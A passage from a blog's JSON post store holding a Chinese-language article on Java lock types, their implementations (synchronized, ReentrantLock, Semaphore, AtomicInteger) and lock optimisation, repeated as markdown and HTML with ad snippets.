class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"java中的各种锁","date":"2018-11-28T08:17:48.000Z","_content":"\n\n## 一、 Java中锁的分类\n\n### 乐观锁\n\n乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。\n\njava中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。\n\n### 悲观锁\n\n悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。\n\n### 自旋锁\n\n自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。\n\n线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。\n\n如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。\n\n### 非公平锁\n\nJVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。\n\n在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。\n\n对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。\n\n### 公平锁\n\n与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。\n\n### 可重入锁（递归锁）\n\n可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。\n\n### ReadWriteLock 读写锁\n\n为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。\n\nJava中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。\n\n### 共享锁和独占锁\n\njava并发包中提供的加锁模式分别为共享锁和独占锁。\n\n**1、独占锁**\n\n独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。\n\n**2、共享锁**\n\n共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。\n\nAQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。\n\n### 重量级锁\n\nSynchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。\n\n### 轻量级锁\n\n锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。\n\n随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。\n\n“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。\n\n### 偏向锁\n\nHotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。\n\n### 分段锁\n\n分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。\n\n\n\n## 二、 JAVA中几种锁的实现\n\n### 1、Synchronized 同步锁\n\nsynchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。\n\n**Synchronized的作用范围**\n\n当做用于方法时，锁住的对象是对象的实例（this）。\n\n当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。\n\n当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。\n\n**Synchronized 核心组件**\n\nWait Set： 那些调用wait方法被阻塞的线程放置在这里\nContention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中\nEntry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中\nOnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck\nOwner： 当前已经获取到资源锁的线程被称为Owner\n!Owner: 当前释放锁的线程\n\n### 2、ReentrantLock\n\nReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。\n\nReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 3、Semaphore 信号量\n\nSemaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。\n\nSemaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。\n\n此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。\n\nSemaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 4、AtomicInteger\n\n此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<V> 将一个对象的所有操作转换为原子操作。\n\n我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。\n\n## 三、 锁的优化\n\n### 1、较少锁持有时间\n\n只在有线程安全的程序上加锁\n\n### 2、减少锁粒度\n\n将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。\n\n### 3、锁分离\n\n最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。\n\n### 4、锁粗化\n\n通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。\n\n### 5、锁消除\n\n锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/java中的各种锁.md","raw":"---\ntitle: java中的各种锁\ndate: 2018-11-28 16:17:48\ntags: ['java','锁', 'CAS']\ncategories: Java\n---\n\n\n## 一、 Java中锁的分类\n\n### 乐观锁\n\n乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。\n\njava中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。\n\n### 悲观锁\n\n悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。\n\n### 自旋锁\n\n自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。\n\n线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。\n\n如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。\n\n### 非公平锁\n\nJVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。\n\n在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。\n\n对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。\n\n### 公平锁\n\n与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。\n\n### 可重入锁（递归锁）\n\n可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。\n\n### ReadWriteLock 读写锁\n\n为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。\n\nJava中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。\n\n### 共享锁和独占锁\n\njava并发包中提供的加锁模式分别为共享锁和独占锁。\n\n**1、独占锁**\n\n独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。\n\n**2、共享锁**\n\n共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。\n\nAQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。\n\n### 重量级锁\n\nSynchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。\n\n### 轻量级锁\n\n锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。\n\n随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。\n\n“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。\n\n### 偏向锁\n\nHotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。\n\n### 分段锁\n\n分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。\n\n\n\n## 二、 JAVA中几种锁的实现\n\n### 1、Synchronized 同步锁\n\nsynchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。\n\n**Synchronized的作用范围**\n\n当做用于方法时，锁住的对象是对象的实例（this）。\n\n当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。\n\n当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。\n\n**Synchronized 核心组件**\n\nWait Set： 那些调用wait方法被阻塞的线程放置在这里\nContention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中\nEntry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中\nOnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck\nOwner： 当前已经获取到资源锁的线程被称为Owner\n!Owner: 当前释放锁的线程\n\n### 2、ReentrantLock\n\nReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。\n\nReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 3、Semaphore 信号量\n\nSemaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。\n\nSemaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。\n\n此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。\n\nSemaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 4、AtomicInteger\n\n此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<V> 将一个对象的所有操作转换为原子操作。\n\n我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。\n\n## 三、 锁的优化\n\n### 1、较少锁持有时间\n\n只在有线程安全的程序上加锁\n\n### 2、减少锁粒度\n\n将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。\n\n### 3、锁分离\n\n最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。\n\n### 4、锁粗化\n\n通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。\n\n### 5、锁消除\n\n锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"java中的各种锁","published":1,"updated":"2018-12-03T09:30:46.432Z","_id":"cjpdmv0an002k4cv0jhzs2i82","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"一、-Java中锁的分类\"><a href=\"#一、-Java中锁的分类\" class=\"headerlink\" title=\"一、 Java中锁的分类\"></a>一、 Java中锁的分类</h2><h3 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h3><p>乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。</p>\n<p>java中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。</p>\n<h3 id=\"悲观锁\"><a href=\"#悲观锁\" class=\"headerlink\" title=\"悲观锁\"></a>悲观锁</h3><p>悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。</p>\n<h3 id=\"自旋锁\"><a href=\"#自旋锁\" class=\"headerlink\" title=\"自旋锁\"></a>自旋锁</h3><p>自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。</p>\n<p>线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。</p>\n<p>如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。</p>\n<h3 id=\"非公平锁\"><a href=\"#非公平锁\" class=\"headerlink\" title=\"非公平锁\"></a>非公平锁</h3><p>JVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。</p>\n<p>在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。</p>\n<p>对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。</p>\n<h3 id=\"公平锁\"><a href=\"#公平锁\" class=\"headerlink\" title=\"公平锁\"></a>公平锁</h3><p>与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。</p>\n<h3 id=\"可重入锁（递归锁）\"><a href=\"#可重入锁（递归锁）\" class=\"headerlink\" title=\"可重入锁（递归锁）\"></a>可重入锁（递归锁）</h3><p>可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。</p>\n<h3 id=\"ReadWriteLock-读写锁\"><a href=\"#ReadWriteLock-读写锁\" class=\"headerlink\" title=\"ReadWriteLock 读写锁\"></a>ReadWriteLock 读写锁</h3><p>为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。</p>\n<p>Java中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。</p>\n<h3 id=\"共享锁和独占锁\"><a href=\"#共享锁和独占锁\" class=\"headerlink\" title=\"共享锁和独占锁\"></a>共享锁和独占锁</h3><p>java并发包中提供的加锁模式分别为共享锁和独占锁。</p>\n<p><strong>1、独占锁</strong></p>\n<p>独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。</p>\n<p><strong>2、共享锁</strong></p>\n<p>共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。</p>\n<p>AQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。</p>\n<h3 id=\"重量级锁\"><a href=\"#重量级锁\" class=\"headerlink\" title=\"重量级锁\"></a>重量级锁</h3><p>Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。</p>\n<h3 id=\"轻量级锁\"><a href=\"#轻量级锁\" class=\"headerlink\" title=\"轻量级锁\"></a>轻量级锁</h3><p>锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。</p>\n<p>随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。</p>\n<p>“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。</p>\n<h3 id=\"偏向锁\"><a href=\"#偏向锁\" class=\"headerlink\" title=\"偏向锁\"></a>偏向锁</h3><p>Hotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。</p>\n<h3 id=\"分段锁\"><a href=\"#分段锁\" class=\"headerlink\" title=\"分段锁\"></a>分段锁</h3><p>分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。</p>\n<h2 id=\"二、-JAVA中几种锁的实现\"><a href=\"#二、-JAVA中几种锁的实现\" class=\"headerlink\" title=\"二、 JAVA中几种锁的实现\"></a>二、 JAVA中几种锁的实现</h2><h3 id=\"1、Synchronized-同步锁\"><a href=\"#1、Synchronized-同步锁\" class=\"headerlink\" title=\"1、Synchronized 同步锁\"></a>1、Synchronized 同步锁</h3><p>synchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。</p>\n<p><strong>Synchronized的作用范围</strong></p>\n<p>当做用于方法时，锁住的对象是对象的实例（this）。</p>\n<p>当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。</p>\n<p>当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。</p>\n<p><strong>Synchronized 核心组件</strong></p>\n<p>Wait Set： 那些调用wait方法被阻塞的线程放置在这里<br>Contention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中<br>Entry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中<br>OnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck<br>Owner： 当前已经获取到资源锁的线程被称为Owner<br>!Owner: 当前释放锁的线程</p>\n<h3 id=\"2、ReentrantLock\"><a href=\"#2、ReentrantLock\" class=\"headerlink\" 